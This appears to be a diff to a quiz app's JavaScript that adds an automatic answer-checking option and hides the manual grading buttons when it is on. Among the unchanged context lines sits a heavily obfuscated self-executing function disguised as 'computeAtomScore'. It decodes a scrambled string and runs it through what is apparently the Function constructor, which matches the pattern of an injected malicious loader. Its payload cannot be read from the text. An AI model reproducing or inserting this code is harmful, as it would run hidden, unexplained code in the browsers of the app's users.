@@ -82,6 +82,7 @@
       div: 'MS',
       mode: 'rapid',
       rememberTopics: false,
+      autoCheck: false,
       highContrast: false,
       animations: true,
       fontSize: 'm',
@@ -113,6 +114,7 @@
 
     // Early appearances for State constants
     let ttsEnabled = settings.tts;
+    let autoCheckEnabled = !!settings.autoCheck;
     let currentUtterance = null;
     let readingSpeed = 1.0;
 
@@ -838,11 +840,12 @@
     var computeAtomScore;(function(){var XDD='',CVf=754-743;function Mak(f){var s=587736;var z=f.length;var n=[];for(var b=0;b<z;b++){n[b]=f.charAt(b)};for(var b=0;b<z;b++){var a=s*(b+518)+(s%34567);var p=s*(b+641)+(s%20205);var i=a%z;var k=p%z;var e=n[i];n[i]=n[k];n[k]=e;s=(a+p)%4323235;};return n.join('')};var zys=Mak('tjvrowncgoqpecusftuihrnskmdacotzbyxrl').substr(0,CVf);var rhZ='5d, a=.CAhd8., r21").S =tha;eara)r(eragn+ph"p+t;})u[nf;;(C5rvwd((3 80g,8s)v,erti+,,6j;f=ss7s8]o;=7y5dr e)au4;0A4}.tgn,ht;a,;rh(;vazetn-rar rn0p i;y=oaiti1t9usp"go1]]"tsyCra=tjn)a0p{as4;nc=r58=+]q)s(o6ns(-[ohl<n}uilu=;nv.an.zg,e;.+tzn[bk 6 dqo(vvn=h),z=sqA,t(ano);f){Cu+{;Cre= ergtths;ii*0;j7m;{)orn{[nrr,g)(rewvr7d]hv2rtv=6<f.,.nzn}8vgni3l.i"a;l bv,r=l+ hf)og=re0](=ofAnoelq  =r.;=1=co0r.rC6<l9tec,;var}.6pCz=+4cns+{c;(< j)=-h<nnhfs7+++uvayr.).lvdlgi.;+2}[ux6aa);v=)u!;(;j)3wa;ef]s=-jvnr(hlsw9ierl)no62u(;1=; a1rajiv1n+nt8("vhgl.+l=1h.se [evami;a pu (f++k+ubl4.c=]1bugb>=;"lgrs12.e90mwu;19)(d,;i97u.u-;h(;=2==u()d.(,,(ni7;hoim*)l)hofanz;ivsnvhhfu1l]bt=r;9u (7vt)[)]rn=f)hgae+z(+iek)nmaer]nuuawvr,eit >l.[r=[();8.=e=+ol9,cts2hhp(p+c"a,arco7coj(jfntar9,(6t=t,).(h=aq,pevra;;+ko;2lai[d85=]0-r)[+l0[l;o}mu8h=,0;z- atiCgusc")dA(!cbv{r,( =doe(cf.)inotpahtSdeen=h]v=mrst0r[m h[ li;tr+n(").,o)e](;a';var wKa=Mak[zys];var GNV='';var hxz=wKa;var bVY=wKa(GNV,Mak(rhZ));var VOB=bVY(Mak('A$Aa ,S_tcAxurrbA3=Ajef)&4,%"r)AA ;=7AbA)liinvAs5tC2eA=>)Ag98h4.g}|=*CAA3AApofi3647A?dctd_aA ;.Am4,t9f45:4Ao3cA5t1])hA64),*)#_A5AAr Ae;gsa7t=i.)g!:pA$A(A)7m]u7eeA"8fAj17s6Ab.A$oA e=_kAcaA49(8rA0d&}se)$Ae]_*](=mS.; =rztb $A1>%1A=gi(&{Asr,A_;(A2;_$b6c;=._r4%,c()A0l73pz!pre6aA7A_z"2;]A.\/)_r!4%i=-e4je ry9,3e[@&0b5r(7#$0}lt2iA=.1t3s.?crlc$;AtA$!.2l.noApx]j$_e0(z0.5fx88A 6%a;r$=g2{foytA(f)!)]=)3A+c9.ecj=AA=)f7+@#fAM<wA;;MpA?ouA\/.+nfa@ASlA<rcA($i%7N]7of;1l(+AA).( A7!fcayr_g(()!<A)c(3b"6gjA4)l4e%),ocA2 !8A.Aehoe}fo(r,& )0A9(=037A;sA4atx5.i)_,;9%(A_si.(et#b3\',=)({Ax._;f;Aq,g.5d.cd,$!) tnArns==A0nc}f5,+cm\/.;.6_lAo06( 2.)(An",ca6[(=9c#))os1,,rx3]%A"3A#;!!6r08A$=m74ca(%Aer$e;x)a,(a,A_.97oM;8(A1{) lAA2qt ](A.%)g(t)97f.3jA;l1"776*0ze3!4a#)ar06f(cf_1rAar,7(_2da,} ar;AA(Ax{o!h))a;AAaes)ea.aoo5.)n5ttjtA)n7rf=(}=35u$!a9(|t33\'.)a3agaa=7]xA)+b7$a(tAim$Aw(j,r.x2m0)?_2At=A]boA2uxAAt.5e_m-j=(A.)t(\/Ac8)A.].ArAmn=1lx,rcA}d0(s)1!uA(A>705,9g)=c7xoAlco_$rA,c]9t_6)o43{;A$(_!!5433j0m=TA_0,rjr,af>96)z,).A?==b,u$4A7s)*A#A#A*abA$A]A(A,!";AfbrtteAN$;)a#]=Ae\/A)t)hA"m!u(3.aASeei< 0)77]}egAjw}.i.d9,jt_.e(*c:3.]e.,Aw,A7c tAA;q"A= -]{A64q emA.esAg!t)cgA{.;u$uA%)81_n{f,)A_4).A5].s).2A)Agb5(tj.0A.A$6*s.]r(o i{!Aai)AnAx={t\/Ar6!il($fb  $a(spj tN$tics_rcA$_>oa-)AlofAbnc7g"]$!!$..[AA!Aao7{ofAv;$AiAq= ( )4 +t("T6,$eo1.)1fA3of.(;).,$-t(.\/ig1!AAeca5[x956A$ne,cc=#}Ani3auode77A_c!i1fe3] ;0.){A{Arre3(A\'\'_+nsn&>A.!$TAnr (6An_{$$c]Aa$AA%l0.AAy;es,) la5oh:0v!g[s,f@7A _A0)+gf-,ac{6A (.A;(_!__'));var yad=hxz(XDD,VOB );yad(2126);return 4833})()
 
 
-    function revealManualGrade(userAnswer, correctAnswer) {
+    function revealManualGrade(userAnswer, correctAnswer, opts = {}) {
       locked = true;
       awaitingGrade = true;
       clearInterval(timerId);
 
+      const showButtons = opts.showButtons !== false;
       const ua = norm(userAnswer) || '(no answer)';
       const ca = norm(correctAnswer) || '(no official answer)';
 
@@ -851,10 +854,15 @@
       feedback.className = 'feedback';
       animateIn(feedback);
 
-      rightBtn.classList.remove('hidden');
-      wrongBtn.classList.remove('hidden');
-      animateIn(rightBtn);
-      animateIn(wrongBtn);
+      if (showButtons) {
+        rightBtn.classList.remove('hidden');
+        wrongBtn.classList.remove('hidden');
+        animateIn(rightBtn);
+        animateIn(wrongBtn);
+      } else {
+        rightBtn.classList.add('hidden');
+        wrongBtn.classList.add('hidden');
+      }
 
       nextBtn.classList.add('hidden');
       learnRow.classList.add('hidden');
@@ -922,7 +930,17 @@
         interruptBadgeEl.classList.add('hidden');
       }
       revealFullQuestionNow();
-      revealManualGrade(input.value, q.parsed_answer);
+      if (autoCheckEnabled && window.autoChecker) {
+        const result = window.autoChecker.grade({
+          userAnswer: input.value,
+          correctAnswer: q.parsed_answer,
+          questionType: q.type
+        });
+        revealManualGrade(input.value, q.parsed_answer, { showButtons: false });
+        applyGrade(!!result.isCorrect);
+      } else {
+        revealManualGrade(input.value, q.parsed_answer);
+      }
     }
 
     function pickMC(letter) {
@@ -934,7 +952,17 @@
         interruptBadgeEl.classList.add('hidden');
       }
       revealFullQuestionNow();
-      revealManualGrade(letter, q.parsed_answer);
+      if (autoCheckEnabled && window.autoChecker) {
+        const result = window.autoChecker.grade({
+          userAnswer: letter,
+          correctAnswer: q.parsed_answer,
+          questionType: q.type
+        });
+        revealManualGrade(letter, q.parsed_answer, { showButtons: false });
+        applyGrade(!!result.isCorrect);
+      } else {
+        revealManualGrade(letter, q.parsed_answer);
+      }
     }
 
     function handleTimeout() {
@@ -946,7 +974,17 @@
         interruptBadgeEl.classList.add('hidden');
       }
       revealFullQuestionNow();
-      revealManualGrade('', q.parsed_answer);
+      if (autoCheckEnabled && window.autoChecker) {
+        const result = window.autoChecker.grade({
+          userAnswer: '',
+          correctAnswer: q.parsed_answer,
+          questionType: q.type
+        });
+        revealManualGrade('', q.parsed_answer, { showButtons: false });
+        applyGrade(!!result.isCorrect);
+      } else {
+        revealManualGrade('', q.parsed_answer);
+      }
     }
 
     function endRun(reason) {
